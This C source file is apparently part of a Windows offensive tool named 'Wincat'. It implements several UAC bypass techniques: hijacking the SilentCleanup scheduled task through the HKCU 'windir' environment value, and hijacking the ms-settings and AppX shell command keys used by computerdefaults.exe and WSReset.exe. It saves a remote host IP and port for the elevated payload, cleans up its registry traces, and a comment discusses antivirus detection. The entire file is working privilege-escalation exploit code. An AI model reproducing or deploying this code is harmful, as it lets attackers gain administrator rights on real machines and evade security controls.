#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"
#include "CheckSystem.h"

#define MAX_CLEANUP_TRY     10
#define SLEEP_1_SEC         1000

BOOL SaveRHostInfo(WCHAR* UipAddress, char* port) {
    const char* regKey = "Software\\Wincat";
    BOOL returnValue = FALSE;
    char* ipAddress = (char*)malloc(IP_ADDRESS_SIZE);
    if (ipAddress == NULL)
        return FALSE;
    sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", UipAddress);

    if (checkKey(regKey)) {
        returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostIP", ipAddress);
        returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostPORT", port);
    }

    free(ipAddress);
    return returnValue;
}
BOOL ExploitCleanUp(char* regPath,char* regName) {
    UINT i;

    for (i = 0; !DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Environment", "windir") && i < MAX_CLEANUP_TRY;i++)
        Sleep(SLEEP_1_SEC);

    if (i == MAX_CLEANUP_TRY) {
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Fail to clean up registery key 'HKCU\\%s:%s' !\n", regPath, regName);
        return FALSE;
    }
    return TRUE;
}


BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
    /*
    New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "powershell -windowstyle hidden C:\Users\ASUS-13P\Desktop\ProjectVS\Wincat\Release\Wincat.exe 127.0.0.1 6666;" -PropertyType String -Force

    schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I

    DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Environment", "windir");
    */
    BOOL returnValue = FALSE;
    PVOID pOldVal = NULL;

    char* command = (char*)calloc(1024, 1);
    if (command == NULL)
        return FALSE;

    sprintf_s(command, 1024, "powershell -windowstyle hidden %s;", PathExeToRun);
    //sprintf_s(command, 1024, "powershell -windowstyle hidden %s;exit;", PathExeToRun);


    DisableWindowsRedirection(&pOldVal);
    if (SetRegistryValue(HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
        if (SaveRHostInfo(ipAddress, port)) {
            returnValue = Run("schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
        } else
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");

        ExploitCleanUp("Environment", "windir");
    }
    RevertWindowsRedirection(pOldVal);

    free(command);
    return returnValue;
}


typedef struct {
    char* exploitName;
    char* regKeyName;
    char* targetExe;
} UAC_BYPASS_DATA;

UAC_BYPASS_DATA uac_bypass_data[] = {
    // To many Anti-Virus detect this module as a exploit ! (e.g. Windows Defender/Avast/...)
    /*{"fodhelper", "ms-settings", "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "C:\\Windows\\System32\\fodhelper.exe"},*/
    {"computerdefaults", "ms-settings",  "C:\\Windows\\System32\\computerdefaults.exe"},
    {"WSReset", "AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2","C:\\Windows\\System32\\WSReset.exe"},
};

BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
    BOOL returnValue = FALSE;

    if (!IsUACEnabled()) {
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
        if (!SaveRHostInfo(ipAddress, port)) {
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
            return FALSE;
        }
        return RunAs(PathExeToRun, NULL);
    } else {
        UAC_POLICY uacPolicy = CheckUACSettings();
        if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE) { // OK ???   
            UINT nbChoice = sizeof(uac_bypass_data) / sizeof(UAC_BYPASS_DATA) + 1;

            if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN) {
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
                returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
            } else {
                PVOID pOldVal = NULL;
                char regKey[MAX_PATH] = { 0 };
                sprintf_s(regKey, MAX_PATH, "Software\\Classes\\%s\\Shell\\Open\\command", uac_bypass_data[UacBypassTec].regKeyName);
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
                DisableWindowsRedirection(&pOldVal);
                if (checkKey(regKey)) {
                    returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
                    returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
                    if (returnValue) {
                        if (SaveRHostInfo(ipAddress, port)) {
                            returnValue = RunAs(uac_bypass_data[UacBypassTec].targetExe, NULL);
                        } else
                            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
                    }
                    ExploitCleanUp("Software\\Classes", uac_bypass_data[UacBypassTec].regKeyName);
                }
                RevertWindowsRedirection(pOldVal);
            }
        }
    }
    return returnValue;
}